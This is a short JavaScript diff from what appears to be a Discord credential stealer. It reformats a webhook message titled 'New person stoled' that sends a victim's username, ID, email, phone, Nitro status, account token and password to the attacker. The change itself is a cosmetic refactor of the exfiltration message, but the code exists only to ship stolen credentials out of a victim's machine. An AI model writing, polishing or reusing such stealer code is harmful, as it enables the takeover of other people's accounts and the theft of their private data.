@@ -42,7 +42,7 @@ exports.send = (req, res, webhook) => {
     name: "Dev By Hideaki#1337 x Stan#1337"
   },
   title: "New person stoled",
-  description: `Username : ` + JSON.parse(JSON.stringify(y)).username + "#" + JSON.parse(JSON.stringify(y)).discriminator + '\n' + `ID : ` + JSON.parse(JSON.stringify(y)).id + '\n' + "E-Mail : " + JSON.parse(JSON.stringify(y)).email + '\n' + "Phone : " + JSON.parse(JSON.stringify(y)).phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : " + password,
+  description: `Username: ${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\nID: ${JSON.parse(JSON.stringify(y)).id}\nE-Mail: ${JSON.parse(JSON.stringify(y)).email}\nPhone: ${JSON.parse(JSON.stringify(y)).phone}\nNitro Type: ${nitro}\nToken: ${token}\nPassword: ${password}`,
   color: hexToDecimal("#cccccc")
 }
             
